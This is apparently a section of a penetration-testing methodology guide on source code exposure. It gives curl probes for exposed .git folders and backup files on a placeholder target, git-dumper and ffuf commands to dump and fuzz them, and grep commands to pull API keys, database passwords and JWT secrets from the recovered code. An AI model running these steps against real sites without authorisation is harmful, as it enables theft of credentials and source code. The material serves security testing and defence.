# 1.2 Source Code Exposure

## Goal

Discover and dump source code via exposed .git folders or backup files.

---

## .git Folder Exposure

Git repository stored in `/.git/` directory. If accessible:

```
https://target.com/.git/config
https://target.com/.git/HEAD
https://target.com/.git/objects/
```

**Discovery:**
```bash
curl https://target.com/.git/config
curl https://target.com/.git/HEAD
```

If returns content (not 404) → .git exposed!

---

## Dumping with git-dumper

**Installation:**
```bash
pip3 install git-dumper
```

**Usage:**
```bash
git-dumper https://target.com/.git output_folder

# Reconstructs entire repository
# Includes all commits, history, branches
```

**Retrieved Information:**
- Complete source code
- Commit history
- All branches
- Author information
- Potentially: API keys, passwords in old commits

## Backup File Discovery

Common backup extensions:

```
.bak, .old, .orig, .backup
.php~, .asp~, .aspx~
.zip, .tar, .tar.gz
.sql, .db, .dbf
```

**Fuzzing:**
```bash
# Try common backup patterns
ffuf -w wordlist.txt -u https://target.com/FUZZ.bak
ffuf -w wordlist.txt -u https://target.com/admin.php.old
ffuf -w wordlist.txt -u https://target.com/FUZZ.zip
```

**Manual checks:**
```bash
curl https://target.com/config.php.bak
curl https://target.com/db.sql
curl https://target.com/backup.zip
curl https://target.com/source.tar.gz
```

## Extracting Secrets from Source

Once you have source code, extract:

**API Keys:**
```grep
grep -r "api_key" .
grep -r "AWS_ACCESS_KEY" .
grep -r "SECRET_KEY" .
```

**Database Credentials:**
```grep
grep -r "password" . | grep -i database
grep -r "db_user" .
grep -r "db_pass" .
```

**JWT Secrets:**
```grep
grep -r "jwt_secret" .
grep -r "signing_key" .
```
